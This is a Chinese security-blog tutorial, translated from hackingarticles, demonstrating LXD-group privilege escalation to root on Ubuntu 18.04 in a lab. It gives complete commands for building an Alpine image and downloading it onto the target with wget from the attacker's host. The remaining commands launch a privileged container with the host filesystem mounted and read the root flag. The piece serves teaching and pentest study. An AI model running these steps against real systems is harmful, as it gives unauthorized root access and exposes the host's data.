***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径**

![](https://image.3001.net/images/20191015/1571106972_5da5309c3f078.png!small)

## 写在前面的话

在这篇文章中，我们将跟大家介绍如何通过利用LXD的漏洞，实现目标设备lxd组用户的提权。

通过适当的操作，本地lxd组的用户成员可以理解将自己的权限提升为主机操作系统的root权限。这种特性与该用户是否已被授权sudo权限无关，而且全程也无需用户输入密码。研究人员表示，LXD
SNAP包中甚至也存在这样的漏洞。

LXD是一个root进程，它可以负责执行任意用户的LXD
UNIX套接字写入访问操作。而且在某些情况下，LXD甚至都不会对调用它的用户权限进行检查和匹配，现在社区也有很多种方法可以利用LXD的这种特性来实施攻击。

其中的一项技术就是使用LXD
API来将目标主机的根文件系统加载进一个容器中，而本文讨论的也是这项技术。一旦成功，攻击者就可以将低权限的用户提升为root权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源。

### LXD和LXC

Linux
Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。

Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC
API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。

### 容器技术

所谓的容器技术，也就是在主机操作系统中创建一个隔离的环境，以允许某个进程或应用程序在一个不影响主操作系统以及其他进程的环境下运行。

![](https://image.3001.net/images/20191015/1571106995_5da530b3d39bf.png!small)

### 技术实现要求

> 目标主机系统：Ubuntu v18.04
>
> 攻击者设备：Kali Linux或其他设备

## 直奔主题

接下来，我们开始操作！

大家可以看到，我们已经在主机设备中创建好了一个名叫“raj”的本地用户账号：

![](https://image.3001.net/images/20191015/1571107016_5da530c86fbfa.png!small)

### LXD安装与配置

执行下列命令完成LXD的安装：

    
    
    apt install lxd

![4.png](https://image.3001.net/images/20191015/1571107031_5da530d72d14c.png!small)

当然了，你还需要为LXD安装一些依赖组件：

    
    
    apt install zfsutils-linux

![5.png](https://image.3001.net/images/20191015/1571107040_5da530e0e2f4d.png!small)

接下来，配置“raj”用户账号，将“raj”添加进LXD组中，执行下列命令：

    
    
    usermod --append --groups lxd raj

![](https://image.3001.net/images/20191015/1571107049_5da530e956dce.png!small)

验证用户“raj”是否已是LXD组的成员：

![](https://image.3001.net/images/20191015/1571107054_5da530eec3730.png!small)

现在我们需要配置LXD，我们可以使用命令“lxd
init”来开启LXD初始化进程。在初始化的过程中，程序将会要用户选择某些配置选项，其中的大多数选项都可以直接使用默认配置。不过在后端存储选项中，我们需要选择“dir”，而不要选择“zfs”。

![](https://image.3001.net/images/20191015/1571107060_5da530f4e648a.png!small)

配置好LXD之后，你需要使用LXC创建一个容器。这里我们为“Ubuntu:18.04”创建了一个容器，并命名为了“intimate-seasnail”。配置完成之后，我们可以使用lxc list命令来查看所有可用的容器：

    
    
    lxc launch ubuntu:18.04
    
    lxc list

使用lxc exec命令即可与容器建立连接，该命令需要提供目标容器名称：

    
    
    lxc exec intimate-seasnail -- /bin/bash

进入容器之后，命令行终端的Shell界面如下：

### 权限提升

利用LXD来实现提权需要我们能够访问目标设备的本地账号，因此我们选择使用SSH来连接并访问目标设备的本地账号。
这里需要注意的是，我们的目标用户账号必须是LXD组的组成员。

    
    
    ssh raj@192.168.1.105

![](https://image.3001.net/images/20191015/1571107082_5da5310a977a2.png!small)

为了将我们的用户账号提升为root权限，我们还需要为LXD创建一个镜像文件，操作步骤如下：

首先，攻击者需要在自己设备上进行如下操作：

> 1、通过git将构建好的alpine镜像克隆至本地；
>
> 2、执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成；
>
> 3、将tar文件发送至目标设备；

接下来，我们需要在目标设备上进行如下操作：

> 1、下载Alpine镜像；
>
> 2、为LXD导入镜像；
>
> 3、在新的容器环境中初始化镜像；
>
> 4、在/root目录中加载容器；

那么接下来，我们先从GitHub库下载构建好的Alpine：

    
    
    git clone  <https://github.com/saghul/lxd-alpine-builder.git>
    
    cd lxd-alpine-builder
    
    ./build-alpine

![](https://image.3001.net/images/20191015/1571107117_5da5312d882be.png!small)

运行完上述命令之后，会在当前目录下创建一个tar.gz文件，之后我们需要将其发送至目标系统：

    
    
    python -m SimpleHTTPServer

![](https://image.3001.net/images/20191015/1571107143_5da531470d59e.png!small)

另一方面，我们还需要将alpine镜像发送至目标系统的/tmp目录中：

    
    
    cd /tmp
    
    wget <http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz>

镜像构建完成之后，我们就可以将其以镜像的形式添加进LXD了：

    
    
    lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage

使用“list”命令即可检查可用的容器列表：

    
    
    lxc image list

![12.png](https://image.3001.net/images/20191015/1571107177_5da5316999927.png!small)

    
    
    lxc init myimage ignite -c security.privileged=true
    
    lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
    
    lxc start ignite
    
    lxc exec ignite /bin/sh
    
    Id

进入容器之后，定位到/mnt/root即可查看目标主机设备的所有资源。运行了Bash脚本之后，我们将得到一个特殊的Shell，也就是容器的Shell。这个容器中包含了目标主机的全部资源，我们可以尝试枚举或搜索flag文件：

    
    
    mnt/root/root
    
    ls
    
    flag.txt
    
    cat flag.txt

![](https://image.3001.net/images/20191015/1571107193_5da5317949f2c.png!small)

## 参考资料

>
> [_https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071_](https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071)

*** 参考来源：[ _hackingarticles_](https://www.hackingarticles.in/lxd-privilege-escalation/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

